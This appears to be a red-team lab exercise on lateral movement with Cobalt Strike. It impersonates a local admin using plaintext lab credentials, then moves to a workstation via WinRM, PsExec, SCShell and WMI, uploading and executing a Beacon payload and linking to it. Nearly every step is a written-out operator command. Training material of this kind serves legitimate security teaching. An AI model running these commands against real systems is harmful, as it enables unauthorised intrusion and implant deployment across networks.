We know from the Discovery lab that rsteel is a local admin on _lon-ws-1_. For the sake of this lab, impersonate them using plaintext credentials:

1.  make_token CONTOSO\rsteel Passw0rd!
    
2.  Test access to the target by listing its C$ share.
    
    1. ls \\lon-ws-1\c$

## Windows Remote Management

1.  Using WinRM, move laterally to _lon-ws-1_.
    1. jump winrm64 lon-ws-1 smb

## PsExec

1.  Using PsExec, move laterally to _lon-ws-1_.
    1. jump psexec64 lon-ws-1 smb

## SCShell

1.  Load the SCShell aggressor script.
    
    1. C:\Tools\SCShell\CS-BOF\scshell.cna
    
    > Cobalt Strike > Script Manager
    
2.  Using SCShell, move laterally to _lon-ws-1_.
    
    1. jump scshell64 lon-ws-1 smb

## WMI

1.  Change Beacon's working directory.
    
    1. cd \\lon-ws-1\ADMIN$
2.  Upload a Beacon payload to the target.
    
    1. upload C:\Payloads\smb_x64.exe
3.  Execute the payload using remote-exec.
    
    1. remote-exec wmi lon-ws-1 C:\Windows\smb_x64.exe
4.  Link to the new Beacon.
    
    1. link lon-ws-1 TSVCPIPE-4b2f70b3-ceba-42a5-a4b5-704e1c41337